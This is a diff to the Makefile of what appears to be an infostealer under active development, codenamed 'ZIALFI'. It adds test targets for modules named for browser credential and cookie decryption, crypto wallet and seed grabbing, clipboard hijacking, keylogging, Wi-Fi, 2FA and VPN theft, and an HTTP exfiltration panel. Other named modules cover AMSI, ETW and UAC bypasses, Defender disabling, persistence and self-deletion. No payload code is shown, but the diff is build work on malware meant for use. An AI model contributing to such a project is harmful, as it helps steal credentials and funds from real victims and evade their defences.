@@ -106,9 +106,7 @@ clean:
 	rm -rf $(OBJ_DIR) $(TARGET)
 
 test-hash: tests/test_hash.c src/types/hash.c include/hash.h include/config.h
-	$(CC) -Wall -Wextra -O2 -Iinclude -c src/types/hash.c -o src/types/hash.o
-	$(CC) -Wall -Wextra -O2 -Iinclude -c tests/test_hash.c -o tests/test_hash.o
-	$(CC) -o tests/test_hash tests/test_hash.o src/types/hash.o
+	$(TEST_CC) $(TEST_CFLAGS) -o tests/test_hash tests/test_hash.c src/types/hash.c
 	./tests/test_hash
 
 # ── Unit tests (native gcc for Linux) ─────────────────────────
@@ -126,8 +124,8 @@ test-sqlite: tests/test_sqlite.c src/parsers/sqlite.c
 	$(TEST_CC) $(TEST_CFLAGS) -o tests/test_sqlite tests/test_sqlite.c src/parsers/sqlite.c
 	./tests/test_sqlite
 
-test-peb: tests/test_peb.c src/types/hash.c
-	$(TEST_CC) $(TEST_CFLAGS) -o tests/test_peb tests/test_peb.c src/types/hash.c
+test-peb: tests/test_peb.c src/types/hash.c src/types/peb.c
+	$(TEST_CC) $(TEST_CFLAGS) -DZIALFI_TEST_MODE -o tests/test_peb tests/test_peb.c src/types/hash.c src/types/peb.c
 	./tests/test_peb
 
 test-chromium: tests/test_chromium.c src/browsers/browser_paths.c src/types/hash.c src/utils/file_utils.c src/types/peb.c src/types/export_resolve.c
@@ -163,8 +161,8 @@ test-lz4: tests/test_lz4.c src/utils/lz4.c
 	./tests/test_lz4
 
 test-chunked: tests/test_chunked.c src/network/chunked.c
-	$(TEST_CC) $(TEST_CFLAGS) -Isrc -Isrc/network -o tests/test_chunked tests/test_chunked.c src/network/chunked.c
-	./tests/test_chunked
+	$(TEST_CC) $(TEST_CFLAGS) -DZIALFI_TEST_MODE -Wno-error -Wno-cpp -Iinclude -Isrc -Isrc/network -Isrc/types -Isrc/utils -Isrc/parsers -std=c11 -o tests/test_chunked.exe tests/test_chunked.c src/network/chunked.c src/network/ws2.c src/network/ws2_peb.c src/types/hash.c src/types/export_resolve.c src/types/peb.c -lws2_32 -ladvapi32
+	tests/test_chunked.exe
 
 test-rt-str: tests/test_rt_str.c src/rt/rt_str.c
 	$(TEST_CC) $(TEST_CFLAGS) -o tests/test_rt_str tests/test_rt_str.c src/rt/rt_str.c
@@ -180,7 +178,7 @@ test-scoring: tests/test_scoring.c src/evasion/anti_analysis.c src/types/hash.c
 
 test-seed-grabber: tests/test_seed_grabber.c
 	$(TEST_CC) $(TEST_CFLAGS) -o tests/test_seed_grabber tests/test_seed_grabber.c
-	./tests/test_seed-grabber
+	./tests/test_seed_grabber
 
 test-asn1: tests/test_asn1.c
 	$(TEST_CC) $(TEST_CFLAGS) -o tests/test_asn1 tests/test_asn1.c
@@ -190,9 +188,17 @@ test-base64: tests/test_base64.c src/utils/base64.c
 	$(TEST_CC) $(TEST_CFLAGS) -o tests/test_base64 tests/test_base64.c src/utils/base64.c
 	./tests/test_base64
 
-test-chrome-crypto: tests/test_chrome_crypto.c src/utils/base64.c
-	$(TEST_CC) $(TEST_CFLAGS) -DTEST_CHROME_CRYPTO_STANDALONE -o tests/test_chrome_crypto tests/test_chrome_crypto.c src/utils/base64.c
+test-chrome-crypto: tests/test_chrome_crypto.c
+	$(TEST_CC) $(TEST_CFLAGS) -Isrc -o tests/test_chrome_crypto tests/test_chrome_crypto.c src/utils/base64.c -lssl -lcrypto
 	./tests/test_chrome_crypto
+
+test-firefox-crypto: tests/test_firefox_crypto.c
+	$(TEST_CC) $(TEST_CFLAGS) -Isrc -o tests/test_firefox_crypto tests/test_firefox_crypto.c src/utils/secure_zero.c -lssl -lcrypto
+	./tests/test_firefox_crypto
+
+test-archive-crypt: tests/test_archive_crypt.c
+	$(TEST_CC) $(TEST_CFLAGS) -Isrc -Isrc/crypto -o tests/test_archive_crypt tests/test_archive_crypt.c src/crypto/chacha_poly.c src/utils/secure_zero.c -lssl -lcrypto
+	./tests/test_archive_crypt
 
 test-json-extract: tests/test_json_extract.c
 	$(TEST_CC) $(TEST_CFLAGS) -DTEST_JSON_EXTRACT_STANDALONE -o tests/test_json_extract tests/test_json_extract.c
@@ -220,11 +226,22 @@ test-sqlite-fault: tests/test_sqlite_fault.c src/parsers/sqlite.c
 	$(TEST_CC) $(TEST_CFLAGS) -o tests/test_sqlite_fault tests/test_sqlite_fault.c src/parsers/sqlite.c
 	tests/test_sqlite_fault
 
+# ── Core type tests ──────────────────────────────────────────
+test-export-resolve: tests/test_export_resolve.c src/types/hash.c src/types/peb.c src/types/export_resolve.c
+	$(TEST_CC) $(TEST_CFLAGS) -DZIALFI_TEST_MODE -o tests/test_export_resolve tests/test_export_resolve.c src/types/hash.c src/types/peb.c src/types/export_resolve.c
+	./tests/test_export_resolve
+
+test-file-utils: tests/test_file_utils.c src/utils/file_utils.c src/types/hash.c src/types/peb.c src/types/export_resolve.c
+	$(TEST_CC) $(TEST_CFLAGS) -DZIALFI_TEST_MODE -Isrc/utils -o tests/test_file_utils tests/test_file_utils.c src/utils/file_utils.c src/types/hash.c src/types/peb.c src/types/export_resolve.c
+	./tests/test_file_utils
+
 # ── Aggregate target ─────────────────────────────────────────
 test-all: test-hash test-crypto test-sqlite test-peb test-chromium test-wallets \
           test-messengers test-network test-evasion test-lz4 \
           test-rt test-scoring test-asn1 test-base64 \
-          test-mock-seams test-fixtures test-sqlite-fault test-network-mock test-crypto-mock
+          test-mock-seams test-fixtures test-sqlite-fault test-network-mock test-crypto-mock test-clipper test-wifi test-keylogger test-gaming test-twofa test-vpn \
+          test-export-resolve test-file-utils test-ws2 test-socks5 test-proxy test-panel-http test-schannel \
+          test-chrome-crypto test-firefox-crypto test-archive-crypt
 	@echo "=== ALL TEST SUITES PASSED ==="
 
 # ── Coverage ─────────────────────────────────────────────────
@@ -237,3 +254,55 @@ test-coverage: clean-tests
 
 test-e2e: tests/test_e2e.c
 	$(CC) -Wall -Wextra -O2 -Iinclude -Isrc/parsers -Isrc/browsers -Isrc/wallets -Isrc/system -Isrc/network -o tests/test_e2e tests/test_e2e.c src/network/panel_http.c src/browsers/browser_paths.c src/browsers/chromium.c src/browsers/firefox.c src/wallets/wallets.c src/wallets/wallet_ext.c src/wallets/wallet_desktop.c src/messengers/messengers.c src/parsers/sqlite.c src/system/system_info.c src/system/wifi.c src/system/twofa.c src/crypto/chrome_crypto.c src/crypto/firefox_crypto.c src/crypto/chacha_poly.c src/crypto/archive_crypt.c src/crypto/dpapi.c src/crypto/chrome_key.c src/crypto/appbound.c src/evasion/anti_analysis.c src/evasion/detection.c src/evasion/evasion.c src/evasion/amsi_bypass.c src/evasion/etw_bypass.c src/evasion/uac_bypass.c src/evasion/peb_hide.c src/evasion/defender_disable.c src/evasion/mutex.c src/cleanup/persistence.c src/cleanup/self_delete.c src/cleanup/temp_wipe.c src/types/peb.c src/types/hash.c src/types/export_resolve.c src/syscalls/engine.c src/network/ws2.c src/network/proxy.c src/network/chunked.c src/network/schannel.c asm/mirage_stubs_v2.o -lws2_32 -lkernel32 -luser32 -ladvapi32 -lbcrypt -lcrypt32
+
+# ── System module tests ────────────────────────────────────
+test-clipper: tests/test_clipper.c
+	$(TEST_CC) $(TEST_CFLAGS) -o tests/test_clipper tests/test_clipper.c
+	./tests/test_clipper
+
+test-wifi: tests/test_wifi.c
+	$(TEST_CC) $(TEST_CFLAGS) -o tests/test_wifi tests/test_wifi.c
+	./tests/test_wifi
+
+test-keylogger: tests/test_keylogger.c
+	$(TEST_CC) $(TEST_CFLAGS) -o tests/test_keylogger tests/test_keylogger.c
+	./tests/test_keylogger
+
+test-gaming: tests/test_gaming.c
+	$(TEST_CC) $(TEST_CFLAGS) -o tests/test_gaming tests/test_gaming.c
+	./tests/test_gaming
+
+test-twofa: tests/test_twofa.c
+	$(TEST_CC) $(TEST_CFLAGS) -o tests/test_twofa tests/test_twofa.c
+	./tests/test_twofa
+
+test-vpn: tests/test_vpn.c
+	$(TEST_CC) $(TEST_CFLAGS) -o tests/test_vpn tests/test_vpn.c
+	./tests/test_vpn
+
+# ── Network module unit tests ────────────────────────────────
+NET_MOCK_DEPS = src/network/ws2.c src/network/ws2_peb.c src/types/hash.c src/types/export_resolve.c src/types/peb.c
+NET_MOCK_FLAGS = -DZIALFI_TEST_MODE -Wno-error -Wno-cpp -Isrc -Isrc/network -Isrc/types -Isrc/utils -Isrc/parsers
+
+test-ws2: tests/test_ws2.c $(NET_MOCK_DEPS)
+	$(TEST_CC) $(TEST_CFLAGS) $(NET_MOCK_FLAGS) -o tests/test_ws2.exe tests/test_ws2.c $(NET_MOCK_DEPS) -lws2_32
+	tests/test_ws2.exe
+
+test-socks5: tests/test_socks5.c
+	$(TEST_CC) $(TEST_CFLAGS) -o tests/test_socks5.exe tests/test_socks5.c
+	tests/test_socks5.exe
+
+test-proxy: tests/test_proxy.c
+	$(TEST_CC) $(TEST_CFLAGS) -o tests/test_proxy.exe tests/test_proxy.c
+	tests/test_proxy.exe
+
+test-panel-http: tests/test_panel_http.c
+	$(TEST_CC) $(TEST_CFLAGS) -o tests/test_panel_http.exe tests/test_panel_http.c
+	tests/test_panel_http.exe
+
+test-schannel: tests/test_schannel.c
+	$(TEST_CC) $(TEST_CFLAGS) -o tests/test_schannel.exe tests/test_schannel.c
+	tests/test_schannel.exe
+
+test-network-unit: test-ws2 test-socks5 test-proxy test-panel-http test-schannel test-network test-network-mock
+	@echo "=== ALL NETWORK TESTS PASSED ==="
